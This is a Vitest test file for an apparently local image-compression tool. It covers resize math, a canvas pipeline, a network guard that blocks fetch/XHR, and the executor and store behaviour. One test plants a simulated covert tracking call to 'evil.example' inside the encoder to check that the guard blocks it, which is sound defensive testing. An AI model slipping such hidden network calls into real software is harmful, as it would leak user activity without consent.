import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { createPinia, setActivePinia } from 'pinia';
import type { Operation } from '@tinypng/shared';
import { planResize } from '../../src/core/local/resize';
import { CanvasPipelineProvider, type Canvas2D, type CanvasRuntime } from '../../src/core/local/canvas-provider';
import { NetworkGuard, NetworkBlockedError } from '../../src/core/local/network-guard';
import { LocalExecutor } from '../../src/core/local/local-executor';
import { defaultCompressionOptions } from '../../src/core/compression/types';
import type { FileAdapter, SourceFile } from '../../src/core/files/contracts';
import { configureExecutorFactory, useWorkbenchStore } from '../../src/stores/workbench';

describe('planResize（D3）', () => {
  it('inside：等比缩进框内，不放大', () => {
    expect(planResize(4000, 2000, { type: 'resize', width: 1000, height: 1000, fit: 'inside' })).toMatchObject({ width: 1000, height: 500 });
    expect(planResize(400, 200, { type: 'resize', width: 1000, height: 1000, fit: 'inside' })).toMatchObject({ width: 400, height: 200 });
  });
  it('contain：画布为框尺寸，居中留白', () => {
    const p = planResize(4000, 2000, { type: 'resize', width: 1000, height: 1000, fit: 'contain' });
    expect(p).toMatchObject({ width: 1000, height: 1000, dw: 1000, dh: 500, dx: 0, dy: 250 });
  });
  it('cover：画布为框尺寸，居中裁切', () => {
    const p = planResize(4000, 2000, { type: 'resize', width: 1000, height: 1000, fit: 'cover' });
    expect(p).toMatchObject({ width: 1000, height: 1000, sw: 2000, sh: 2000, sx: 1000, sy: 0, dw: 1000, dh: 1000 });
  });
  it('只给宽：等比；inside 不放大', () => {
    expect(planResize(800, 600, { type: 'resize', width: 400, fit: 'cover' })).toMatchObject({ width: 400, height: 300 });
    expect(planResize(800, 600, { type: 'resize', width: 1600, fit: 'contain' })).toMatchObject({ width: 1600, height: 1200 });
    expect(planResize(800, 600, { type: 'resize', width: 1600, fit: 'inside' })).toMatchObject({ width: 800, height: 600 });
  });
  it('非法尺寸报错', () => {
    expect(() => planResize(10, 10, { type: 'resize', width: 0, fit: 'inside' })).toThrow();
  });
});

function fakeRuntime() {
  const draws: Array<{ canvas: { width: number; height: number }; args: number[] }> = [];
  const fills: number[] = [];
  const encodes: Array<{ mime: string; quality: number; width: number; height: number }> = [];
  const runtime: CanvasRuntime = {
    decode: async () => ({ width: 4000, height: 2000, source: {} as CanvasImageSource }),
    createCanvas(width, height) {
      const canvas: Canvas2D = {
        width, height,
        getContext: () => ({
          imageSmoothingEnabled: true, imageSmoothingQuality: 'high', fillStyle: '',
          drawImage: ((...args: unknown[]) => { draws.push({ canvas, args: args.slice(1) as number[] }); }) as CanvasRenderingContext2D['drawImage'],
          fillRect: () => { fills.push(1); }
        })
      };
      return canvas;
    },
    encode: async (canvas, mime, quality) => {
      encodes.push({ mime, quality, width: canvas.width, height: canvas.height });
      return new Uint8Array(10);
    }
  };
  return { runtime, draws, fills, encodes };
}

const signal = () => new AbortController().signal;

describe('CanvasPipelineProvider（D3）', () => {
  it('compress + convert(webp) + resize(cover)', async () => {
    const f = fakeRuntime();
    const ops: Operation[] = [{ type: 'compress', quality: 0.7 }, { type: 'resize', width: 1000, height: 1000, fit: 'cover' }, { type: 'convert', format: 'webp' }];
    const out = await new CanvasPipelineProvider(f.runtime).process(new Uint8Array(100), ops, { ...defaultCompressionOptions, inputMime: 'image/png' }, signal());
    expect(out).toMatchObject({ mime: 'image/webp', width: 1000, height: 1000, size: 10, ratio: 0.1 });
    expect(f.encodes).toEqual([{ mime: 'image/webp', quality: 0.7, width: 1000, height: 1000 }]);
    expect(f.draws.at(-1)?.args).toEqual([1000, 0, 2000, 2000, 0, 0, 1000, 1000]);
    expect(f.fills).toHaveLength(0);
  });

  it('输出 JPEG 时铺白底（contain 留白）', async () => {
    const f = fakeRuntime();
    const out = await new CanvasPipelineProvider(f.runtime).process(new Uint8Array(100), [{ type: 'resize', width: 500, height: 500, fit: 'contain' }, { type: 'convert', format: 'jpeg' }], { ...defaultCompressionOptions, inputMime: 'image/png' }, signal());
    expect(out).toMatchObject({ mime: 'image/jpeg', width: 500, height: 500 });
    expect(f.fills.length).toBeGreaterThan(0);
  });

  it('AVIF、裁切等不支持', async () => {
    const p = new CanvasPipelineProvider(fakeRuntime().runtime);
    await expect(p.process(new Uint8Array(1), [{ type: 'convert', format: 'avif' }], defaultCompressionOptions, signal())).rejects.toMatchObject({ code: 'OPERATION_UNSUPPORTED' });
    await expect(p.process(new Uint8Array(1), [{ type: 'crop', width: 1, height: 1 }], defaultCompressionOptions, signal())).rejects.toMatchObject({ code: 'OPERATION_UNSUPPORTED' });
  });

  it('缩放后超像素上限报错', async () => {
    const p = new CanvasPipelineProvider(fakeRuntime().runtime);
    await expect(p.process(new Uint8Array(1), [{ type: 'resize', width: 10000, height: 10000, fit: 'cover' }], { ...defaultCompressionOptions, inputMime: 'image/jpeg' }, signal())).rejects.toMatchObject({ code: 'PIXELS_TOO_LARGE' });
  });
});

describe('NetworkGuard（D3）', () => {
  it('启用期间拦截 fetch/XHR 并计数，结束后恢复', async () => {
    const original = vi.fn(async () => new Response('ok'));
    const target = { fetch: original, XMLHttpRequest: class {} } as unknown as typeof globalThis & Record<string, unknown>;
    const guard = new NetworkGuard(target);
    await guard.run(async () => {
      await expect((target.fetch as typeof fetch)('https://x')).rejects.toBeInstanceOf(NetworkBlockedError);
      expect(() => new (target.XMLHttpRequest as unknown as new () => unknown)()).toThrow(NetworkBlockedError);
    });
    expect(guard.blocked).toBe(2);
    expect(target.fetch).toBe(original);
    expect(original).not.toHaveBeenCalled();
  });
});

const file = (id: string, size = 4): SourceFile => ({ id, name: id + '.png', size, mime: 'image/png', relativePath: id + '.png' });
function adapter(): FileAdapter {
  return {
    chooseFiles: async () => [], chooseDirectory: async () => [],
    read: async () => new Uint8Array(100),
    writeTemp: async (id, b, ext, mime) => ({ id, name: id + '.' + ext, size: b.byteLength, mime, relativePath: id }),
    copyToClipboard: async () => undefined, replaceOriginal: async () => undefined, cleanup: async () => undefined
  };
}

describe('LocalExecutor（D3）', () => {
  let fetchSpy: ReturnType<typeof vi.fn>;
  const realFetch = globalThis.fetch;
  beforeEach(() => {
    fetchSpy = vi.fn(async () => new Response('x'));
    globalThis.fetch = fetchSpy as unknown as typeof fetch;
  });
  afterEach(() => { globalThis.fetch = realFetch; });

  it('本地模式网络请求数为 0：完整跑完一批，处理中尝试 fetch 也被拦', async () => {
    const f = fakeRuntime();
    const runtime: CanvasRuntime = {
      ...f.runtime,
      // 模拟有人在处理时偷偷发请求
      encode: async (c, m, q) => { await fetch('https://evil.example/track').catch(() => undefined); return f.runtime.encode(c, m, q); }
    };
    const exec = new LocalExecutor({
      adapter: adapter(),
      pipeline: { providerId: 'official-tinify', operations: [{ type: 'compress' }, { type: 'resize', width: 100, fit: 'inside' }], destinations: [{ type: 'download' }] },
      provider: new CanvasPipelineProvider(runtime)
    });
    exec.addFiles([file('a'), file('b'), file('c')]);
    await exec.start();
    expect(exec.items.every(i => i.status === 'completed')).toBe(true);
    expect(exec.items[0]?.output?.width).toBe(100);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(exec.guard.blocked).toBe(3);
    expect(exec.guard.active).toBe(false);
    expect(globalThis.fetch).toBe(fetchSpy);
  });

  it('并发默认 5，加文件不自动开始', async () => {
    let running = 0; let peak = 0; let release!: () => void;
    const gate = new Promise<void>(r => { release = r; });
    const exec = new LocalExecutor({
      adapter: adapter(),
      pipeline: { providerId: 'local', operations: [{ type: 'compress' }], destinations: [{ type: 'download' }] },
      provider: { process: async (input) => { running++; peak = Math.max(peak, running); await gate; running--; return { bytes: input, mime: 'image/png', size: 1, width: 1, height: 1, ratio: 1 }; } }
    });
    exec.addFiles(Array.from({ length: 7 }, (_, i) => file('f' + i)));
    await new Promise(r => setTimeout(r, 5));
    expect(peak).toBe(0);
    const run = exec.start();
    await new Promise(r => setTimeout(r, 5));
    expect(peak).toBe(5);
    release();
    await run;
  });

  it('不支持 URL 输入', () => {
    const exec = new LocalExecutor({ adapter: adapter(), pipeline: { providerId: 'local', operations: [], destinations: [] } });
    expect(() => exec.addUrls()).toThrow();
  });
});

describe('workbenchStore + LocalExecutor（D2/D3）', () => {
  beforeEach(() => {
    setActivePinia(createPinia());
    configureExecutorFactory((_mode, pipeline) => new LocalExecutor({ adapter: adapter(), pipeline, provider: new CanvasPipelineProvider(fakeRuntime().runtime) }));
  });

  it('本地模式不显示 URL 输入；超过 20MB 不进草稿；手动开始', async () => {
    const store = useWorkbenchStore();
    expect(store.canAddUrls).toBe(false);
    expect(() => store.addUrls(['https://a/b.png'])).toThrow();
    store.addFiles([file('ok'), file('big', 21 * 1024 * 1024)]);
    expect(store.items).toHaveLength(1);
    expect(store.rejected[0]?.name).toBe('big.png');
    expect(store.draftCount).toBe(1);
    expect(store.queue[0]?.view).toMatchObject({ state: 'draft', actions: ['remove'] });
    await store.start();
    expect(store.items[0]?.status).toBe('completed');
    expect(store.batchStatus).toBe('completed');
    expect(store.queue[0]?.view.state).toBe('completed');
  });

  it('移除草稿', () => {
    const store = useWorkbenchStore();
    store.addFiles([file('a'), file('b')]);
    expect(store.remove(store.items[0]!.id)).toBe(true);
    expect(store.items.map(i => i.source.kind === 'file' && i.source.file.id)).toEqual(['b']);
  });
});
